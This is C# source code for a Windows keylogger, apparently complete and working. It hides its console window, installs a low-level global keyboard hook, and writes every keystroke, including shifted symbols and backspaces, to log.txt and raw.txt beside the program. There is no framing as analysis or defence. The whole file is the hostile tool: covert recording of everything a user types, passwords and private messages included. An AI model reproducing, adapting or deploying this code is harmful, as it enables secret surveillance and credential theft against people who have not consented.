using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading.Tasks;
using System.Reflection.Emit;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static Stopwatch stopwatch = new Stopwatch();
    private const int IdleThreshold = 2000; // 2 sekundy

    public static void Main()
    {
        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        stopwatch.Start();

        Application.Run();

        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static string CheckSymbols(Keys key)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
        if (shiftKey)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                case Keys.Oemtilde: return "~";
                case Keys.OemMinus: return "_";
                case Keys.Oemplus: return "+";
                case Keys.OemOpenBrackets: return "{";
                case Keys.OemCloseBrackets: return "}";
                case Keys.OemSemicolon: return ":";
                case Keys.OemQuotes: return "\"";
                case Keys.OemPipe: return "|";
                case Keys.Oemcomma: return "<";
                case Keys.OemPeriod: return ">";
                case Keys.OemQuestion: return "?";
                case Keys.Back: return "|BACK|"; // backspace
                case Keys.Space: return " ";
            }
        }
        else
        {
            switch (key)
            {
                case Keys.D1: return "1";
                case Keys.D2: return "2";
                case Keys.D3: return "3";
                case Keys.D4: return "4";
                case Keys.D5: return "5";
                case Keys.D6: return "6";
                case Keys.D7: return "7";
                case Keys.D8: return "8";
                case Keys.D9: return "9";
                case Keys.D0: return "0";
                case Keys.Oemtilde: return "`";
                case Keys.OemMinus: return "-";
                case Keys.Oemplus: return "=";
                case Keys.OemOpenBrackets: return "[";
                case Keys.OemCloseBrackets: return "]";
                case Keys.OemSemicolon: return ";";
                case Keys.OemQuotes: return "'";
                case Keys.OemPipe: return "\\";
                case Keys.Oemcomma: return ",";
                case Keys.OemPeriod: return ".";
                case Keys.OemQuestion: return "/";
                case Keys.Back: return "|BACK|"; // backspace
                case Keys.Space: return " ";
            }
        }

        return "";
    }

    private static string Parse(int key)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;

        char keyChar = (char)key;

        string finalResult = CheckSymbols((Keys)key);
        // jesli nie jest symbolem
        if (finalResult.Length > 0)
            return finalResult;

        // litery
        if (char.IsLetter(keyChar))
        {
            char caseSensitiveChar = shiftKey ? char.ToUpper(keyChar) : char.ToLower(keyChar);

            finalResult = caseSensitiveChar.ToString();
            return finalResult;
        }

        return finalResult;
    }

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            StreamWriter rawSw = new StreamWriter(Application.StartupPath + @"\raw.txt", true);
            if (stopwatch.ElapsedMilliseconds >= IdleThreshold)
            {
                sw.WriteLine();
                rawSw.WriteLine();
            }
            sw.Write(Parse(vkCode));
            rawSw.Write((Keys)vkCode);
            sw.Close();
            rawSw.Close();
            stopwatch.Restart();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
}